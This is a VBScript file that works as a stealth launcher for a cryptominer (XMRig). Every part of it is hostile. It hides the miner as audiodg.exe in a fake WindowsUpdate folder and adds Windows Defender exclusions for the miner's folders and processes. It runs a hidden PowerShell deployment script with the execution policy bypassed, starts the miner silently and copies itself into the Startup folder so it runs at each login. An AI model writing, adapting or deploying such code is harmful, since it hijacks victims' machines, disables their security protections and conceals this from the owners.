' =====================================================================
' SILENT_LAUNCH.vbs - Smart + Defender Exclusion Version
' =====================================================================
' - Auto-finds DEPLOY_ULTIMATE.ps1 in the same folder
' - Adds important folders to Windows Defender exclusions (needs Admin)
' - If miner is missing → runs full deployment as Admin
' - If miner exists → starts it silently
' - Adds itself to Startup
' =====================================================================

Option Explicit

Dim WshShell, fso, minerFolder, minerExe, configFile
Dim deployScript, vbsName, startupFolder, currentFolder
Dim objWMIService, colProcesses, cmd

Set WshShell = CreateObject("WScript.Shell")
Set fso = CreateObject("Scripting.FileSystemObject")

' ===================== FIXED PATHS =====================
minerFolder   = "C:\ProgramData\Microsoft\Windows\WindowsUpdate"
minerExe      = minerFolder & "\audiodg.exe"
configFile    = minerFolder & "\config.json"
' =======================================================

' Get current folder of this VBS
currentFolder = fso.GetParentFolderName(WScript.ScriptFullName)
deployScript  = currentFolder & "\DEPLOY_ULTIMATE.ps1"

vbsName       = "SILENT_LAUNCH.vbs"
startupFolder = WshShell.SpecialFolders("Startup") & "\" & vbsName

' ========== FUNCTION: Add Defender Exclusions ==========
Sub AddDefenderExclusions()
    ' This will only work if running elevated
    cmd = "powershell.exe -ExecutionPolicy Bypass -Command """ & _
          "Add-MpPreference -ExclusionPath 'C:\ProgramData\Microsoft\Windows\WindowsUpdate' -Force; " & _
          "Add-MpPreference -ExclusionPath '" & currentFolder & "' -Force; " & _
          "Add-MpPreference -ExclusionProcess 'audiodg.exe' -Force; " & _
          "Add-MpPreference -ExclusionProcess 'xmrig.exe' -Force"""
    
    WshShell.Run cmd, 0, True
End Sub

' ========== CHECK IF MINER IS ALREADY INSTALLED ==========
If fso.FileExists(minerExe) And fso.FileExists(configFile) Then

    ' Miner exists → just start it if not running
    Set objWMIService = GetObject("winmgmts:\\.\root\cimv2")
    Set colProcesses = objWMIService.ExecQuery("Select * From Win32_Process Where Name = 'audiodg.exe'")

    If colProcesses.Count = 0 Then
        Dim cmdLine
        cmdLine = """" & minerExe & """ --config=""" & configFile & """ --no-color"
        WshShell.Run cmdLine, 0, False
    End If

Else
    ' Miner is NOT installed

    ' First try to add Defender exclusions (will need elevation)
    On Error Resume Next
    AddDefenderExclusions
    On Error GoTo 0

    ' Then run the full deployment script as Administrator
    If fso.FileExists(deployScript) Then
        WshShell.Run "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -File """ & deployScript & """", 0, False
    End If
End If

' ========== ADD TO STARTUP FOLDER ==========
If Not fso.FileExists(startupFolder) Then
    On Error Resume Next
    fso.CopyFile WScript.ScriptFullName, startupFolder, True
    On Error GoTo 0
End If

WScript.Quit